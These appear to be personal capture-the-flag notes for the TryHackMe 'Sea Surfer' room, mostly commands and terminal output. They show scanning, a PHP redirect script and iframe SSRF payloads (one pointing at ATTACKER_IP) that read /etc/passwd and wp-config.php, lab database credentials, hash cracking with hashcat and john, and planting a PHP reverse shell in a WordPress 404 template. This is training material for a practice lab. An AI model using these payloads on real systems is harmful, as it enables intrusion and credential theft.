https://tryhackme.com/room/seasurfer

https://nananan.github.io/posts/seasurfer/

https://github.com/lassidev/writeups/blob/main/TryHackMe/Sea%20Surfer.md


```
┌──(kali㉿kali)-[~/thm/seasurfer]
└─$ nmap -sC -sV 10.10.90.23          
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-31 07:03 +0630
Nmap scan report for 10.10.90.23
Host is up (0.22s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 87e3d432cd51d29670ef5f482250ab67 (RSA)
|   256 27d137b0c53cb5816a7c368a2b639ab9 (ECDSA)
|_  256 7f131bcfe64551b909439a232f503c94 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.10 seconds
```

![[Pasted image 20230531071805.png]]

```
echo "10.10.90.23 seasurfer.thm" | sudo tee -a /etc/hosts
```

http://seasurfer.thm/

![[Pasted image 20230531072102.png]]

http://internal.seasurfer.thm/

![[Pasted image 20230531201310.png]]

```
<?php
$loc = "http://127.0.0.1/";
if(isset($_GET['a'])){
$loc = $_GET['a']; 
}
header('Location: '.$loc);
?>
```

```
php -S 0.0.0.0:80
```

![[Pasted image 20230531203229.png]]


```
<iframe height=2000 width=1000 src="http://ATTACKER_IP/ssrf.php?a=file:///var/www/wordpress/wp-config.php">
```

```
<iframe height=2000 width=1000 src="http://10.17.44.152/ssrf.php?a=file:///etc/passwd">
```

![[Pasted image 20230531203409.png]]

![[Pasted image 20230531203605.png]]

![[Pasted image 20230531203649.png]]


```
<iframe height=2000 width=1000 src="http://10.17.44.152/ssrf.php?a=file:///var/www/wordpress/wp-config.php">
```

![[Pasted image 20230531202224.png]]



![[Pasted image 20230531203936.png]]

![[Pasted image 20230531204517.png]]

```
gobuster dir -w /usr/share/wordlists/dirb/big.txt -e -k -b 404 -u http://seasurfer.thm
```

![[Pasted image 20230531213604.png]]

http://seasurfer.thm/adminer/

```
/ ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );
/** Database username */
define( 'DB_USER', 'wordpressuser' );
/** Database password */
define( 'DB_PASSWORD', 'coolDataTablesMan' );
/** Database hostname */
define( 'DB_HOST', 'localhost' );
```

![[Pasted image 20230531213847.png]]

http://seasurfer.thm/adminer/?server=localhost&username=wordpressuser&db=wordpress

![[Pasted image 20230531213931.png]]

```
hashid -m '$P$BuCryp52DAdCRIcLrT9vrFNb0vPcyi/'
```

![[Pasted image 20230531214458.png]]

```
hashcat -m 400 '$P$BuCryp52DAdCRIcLrT9vrFNb0vPcyi/' /usr/share/wordlists/rockyou.txt
```

```
john -w=/usr/share/wordlists/rockyou.txt kyle_wp.hash
```

![[Pasted image 20230531215717.png]]

http://seasurfer.thm/wp-login.php

```
kyle : jenny4ever
```

http://seasurfer.thm/wp-login.php?redirect_to=http%3A%2F%2Fseasurfer.thm%2Fwp-admin%2F&action=confirm_admin_email&wp_lang=en_US

![[Pasted image 20230531215902.png]]

![[Pasted image 20230531215926.png]]

```
┌──(kali㉿kali)-[/usr/share/wordlists]
└─$ locate php-reverse-shell.php       
/usr/share/laudanum/php/php-reverse-shell.php
/usr/share/laudanum/wordpress/templates/php-reverse-shell.php
/usr/share/seclists/Web-Shells/laudanum-0.8/php/php-reverse-shell.php
/usr/share/webshells/php/php-reverse-shell.php

┌──(kali㉿kali)-[/usr/share/wordlists]
└─$ 
```

```
┌──(kali㉿kali)-[~/www]
└─$ cp /usr/share/webshells/php/php-reverse-shell.php .

┌──(kali㉿kali)-[~/www]
└─$ ll
total 16
-rwxr-xr-x 1 kali kali 5491 May 31 22:04 php-reverse-shell.php
-rw-r--r-- 1 kali kali   12 May 13 13:14 test.html
-rw-r--r-- 1 kali kali   12 May 13 13:15 test.txt                                                         
┌──(kali㉿kali)-[~/www]
└─$
```

![[Pasted image 20230531220820.png]]

http://seasurfer.thm/i-am-not-existed-page *To response 404.php page and get PHP reverse shell.*

![[Pasted image 20230531221048.png]]

